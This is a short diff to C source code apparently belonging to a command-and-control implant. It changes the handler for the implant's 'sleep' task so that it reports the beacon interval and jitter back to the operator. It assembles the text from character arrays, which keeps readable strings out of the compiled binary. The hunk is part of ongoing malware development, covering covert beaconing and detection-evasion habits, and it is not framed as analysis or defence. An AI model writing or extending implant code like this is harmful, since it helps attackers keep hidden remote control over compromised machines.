@@ -367,7 +367,34 @@ static void handle_sleep_task(IMPLANT_CONTEXT *ctx, TASK *task) {
             cfg->jitter_percent = (DWORD)task->data[4];
     }
 
-    store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, NULL, 0);
+    /* Build result string: "interval=30s jitter=15%" */
+    {
+        char result[64];
+        DWORD rpos = 0;
+        /* "interval=" */
+        char s_interval[] = {'i','n','t','e','r','v','a','l','=',0};
+        for (DWORD k = 0; s_interval[k]; k++) result[rpos++] = s_interval[k];
+        /* Convert interval to string */
+        char num[12];
+        DWORD nlen = 0;
+        DWORD val = cfg->sleep_interval;
+        if (val == 0) { num[nlen++] = '0'; }
+        else { char tmp[12]; DWORD tlen = 0; while (val > 0) { tmp[tlen++] = '0' + (val % 10); val /= 10; } for (DWORD k = tlen; k > 0; k--) num[nlen++] = tmp[k-1]; }
+        for (DWORD k = 0; k < nlen; k++) result[rpos++] = num[k];
+        result[rpos++] = 's';
+        result[rpos++] = ' ';
+        /* "jitter=" */
+        char s_jitter[] = {'j','i','t','t','e','r','=',0};
+        for (DWORD k = 0; s_jitter[k]; k++) result[rpos++] = s_jitter[k];
+        val = cfg->jitter_percent;
+        nlen = 0;
+        if (val == 0) { num[nlen++] = '0'; }
+        else { char tmp[12]; DWORD tlen = 0; while (val > 0) { tmp[tlen++] = '0' + (val % 10); val /= 10; } for (DWORD k = tlen; k > 0; k--) num[nlen++] = tmp[k-1]; }
+        for (DWORD k = 0; k < nlen; k++) result[rpos++] = num[k];
+        result[rpos++] = '%';
+        result[rpos] = 0;
+        store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, (BYTE*)result, rpos);
+    }
 }
 
 /* ------------------------------------------------------------------ */
